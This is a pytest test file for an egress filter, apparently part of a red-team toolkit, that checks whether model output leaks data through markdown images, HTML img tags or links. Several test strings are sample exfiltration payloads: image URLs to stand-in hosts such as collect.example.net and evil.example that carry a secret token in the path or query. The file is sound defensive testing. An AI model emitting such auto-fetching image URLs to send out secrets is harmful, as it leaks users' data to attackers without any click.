import pytest

from redteam.egress import EgressFilter, EgressLog, default_filter

SECRETS = frozenset({"INTERNAL_TOKEN_9f3a"})


@pytest.fixture
def permissive():
    return default_filter(SECRETS, strict=False)


@pytest.fixture
def strict():
    return default_filter(SECRETS, strict=True)


class TestZeroClickDetection:
    def test_markdown_image_is_detected(self, permissive):
        text = "![x](https://collect.example.net/a)"
        assert permissive.inspect(text).findings

    def test_markdown_image_is_zero_click(self, permissive):
        # The distinction that matters: an image fires on render, with no
        # user action at all. A link needs a click.
        text = "![x](https://collect.example.net/a)"
        assert permissive.inspect(text).zero_click

    def test_html_img_is_zero_click(self, permissive):
        text = '<img src="https://collect.example.net/a">'
        assert permissive.inspect(text).zero_click

    def test_markdown_link_is_not_zero_click(self, strict):
        text = "[click](https://collect.example.net/a)"
        verdict = strict.inspect(text)
        assert verdict.findings and not verdict.zero_click

    def test_permissive_mode_still_blocks_auto_fetch(self, permissive):
        # Permissive does not mean "allow everything". It relaxes links the
        # user must click; it never relaxes a fetch that happens on render,
        # because the user cannot decline something they were not asked
        # about.
        assert not permissive.inspect("![x](https://unknown.example/a)").allowed

    def test_permissive_mode_allows_a_clickable_link(self, permissive):
        assert permissive.inspect("[x](https://unknown.example/a)").allowed

    def test_bare_url_is_not_zero_click(self, permissive):
        verdict = permissive.inspect("see https://collect.example.net/a")
        assert not verdict.zero_click

    def test_plain_text_produces_no_findings(self, permissive):
        assert not permissive.inspect("an ordinary reply").findings

    def test_every_finding_names_a_url(self, permissive):
        text = "![x](https://a.example/1) and [y](https://b.example/2)"
        for finding in permissive.inspect(text).findings:
            assert finding.url.startswith("http")

    def test_multiple_findings_are_all_reported(self, permissive):
        text = "![a](https://a.example/1) ![b](https://b.example/2)"
        assert len(permissive.inspect(text).findings) == 2


class TestHostAllowlist:
    def test_allowed_host_passes_in_strict_mode(self):
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert f.inspect("![x](https://example.com/a)").allowed

    def test_unknown_host_is_blocked_in_strict_mode(self, strict):
        assert not strict.inspect("![x](https://collect.example.net/a)").allowed

    def test_unknown_host_is_permitted_in_permissive_mode(self, permissive):
        # Permissive is not "weaker", it is a different tradeoff: it accepts
        # a residual channel so that ordinary mail keeps working.
        assert permissive.inspect("[x](https://unknown.example/a)").allowed

    def test_subdomain_of_an_allowed_host_is_allowed(self):
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert f.inspect("![x](https://mail.example.com/a)").allowed

    def test_suffix_lookalike_is_not_allowed(self):
        # The classic allowlist bug: endswith("example.com") also matches
        # notexample.com, which is a domain an attacker can simply register.
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert not f.inspect("![x](https://notexample.com/a)").allowed

    def test_host_is_matched_case_insensitively(self):
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert f.inspect("![x](https://EXAMPLE.COM/a)").allowed

    def test_userinfo_does_not_spoof_the_host(self):
        # https://example.com@evil.example/ has host evil.example.
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert not f.inspect("![x](https://example.com@evil.example/a)").allowed

    def test_port_is_stripped_before_matching(self):
        f = EgressFilter(frozenset({"example.com"}),
                         allow_links_to_unknown_hosts=False)
        assert f.inspect("![x](https://example.com:8443/a)").allowed


class TestSecretDetection:
    def test_secret_in_a_url_path_is_found(self, permissive):
        text = "![x](https://collect.example.net/INTERNAL_TOKEN_9f3a)"
        assert not permissive.inspect(text).allowed

    def test_secret_in_a_query_string_is_found(self, permissive):
        text = "![x](https://collect.example.net/a?t=INTERNAL_TOKEN_9f3a)"
        assert not permissive.inspect(text).allowed

    def test_secret_in_body_text_is_found(self, permissive):
        assert not permissive.inspect("the token is INTERNAL_TOKEN_9f3a").allowed

    def test_a_secret_blocks_even_a_permitted_host(self):
        f = EgressFilter(frozenset({"example.com"}), SECRETS)
        text = "![x](https://example.com/INTERNAL_TOKEN_9f3a)"
        assert not f.inspect(text).allowed

    def test_no_secret_no_block_for_a_clickable_link(self, permissive):
        assert permissive.inspect("[x](https://anywhere.example/a)").allowed


class TestRedaction:
    def test_redaction_removes_the_url(self, permissive):
        text = "![x](https://collect.example.net/INTERNAL_TOKEN_9f3a)"
        verdict = permissive.inspect(text)
        assert "collect.example.net" not in permissive.redact(text,
                                                              verdict.findings)

    def test_redaction_leaves_surrounding_prose(self, permissive):
        text = "Here you go: ![x](https://collect.example.net/INTERNAL_TOKEN_9f3a)"
        verdict = permissive.inspect(text)
        assert "Here you go:" in permissive.redact(text, verdict.findings)

    def test_redaction_with_no_findings_is_identity(self, permissive):
        assert permissive.redact("hello", []) == "hello"

    def test_redaction_is_idempotent(self, permissive):
        text = "![x](https://collect.example.net/INTERNAL_TOKEN_9f3a)"
        once = permissive.redact(text, permissive.inspect(text).findings)
        twice = permissive.redact(once, permissive.inspect(once).findings)
        assert once == twice

    def test_redaction_removes_every_finding(self, permissive):
        text = ("![a](https://a.example/INTERNAL_TOKEN_9f3a) "
                "![b](https://b.example/INTERNAL_TOKEN_9f3a)")
        out = permissive.redact(text, permissive.inspect(text).findings)
        assert "a.example" not in out and "b.example" not in out


class TestVerdict:
    def test_verdict_names_a_rule_when_blocking(self, strict):
        assert strict.inspect("![x](https://evil.example/a)").rule

    def test_allowed_verdict_has_no_blocking_rule(self, permissive):
        verdict = permissive.inspect("ordinary text")
        assert verdict.allowed

    def test_redacted_text_is_present_on_a_blocked_verdict(self, strict):
        verdict = strict.inspect("![x](https://evil.example/a)")
        assert verdict.redacted is not None


class TestEgressLog:
    def test_counts_blocked_verdicts(self, strict):
        log = EgressLog()
        log.record(strict.inspect("![x](https://evil.example/a)"))
        assert log.blocked == 1

    def test_does_not_count_allowed_verdicts(self, strict):
        log = EgressLog()
        log.record(strict.inspect("ordinary text"))
        assert log.blocked == 0

    def test_empty_log_counts_zero(self):
        assert EgressLog().blocked == 0


class TestDefaultFilter:
    def test_default_filter_is_permissive_unless_asked(self):
        assert default_filter(SECRETS).inspect(
            "[x](https://unknown.example/a)").allowed

    def test_strict_filter_blocks_more_than_permissive(self):
        text = "[x](https://unknown.example/a)"
        assert (default_filter(SECRETS, strict=True).inspect(text).allowed
                is not default_filter(SECRETS).inspect(text).allowed)
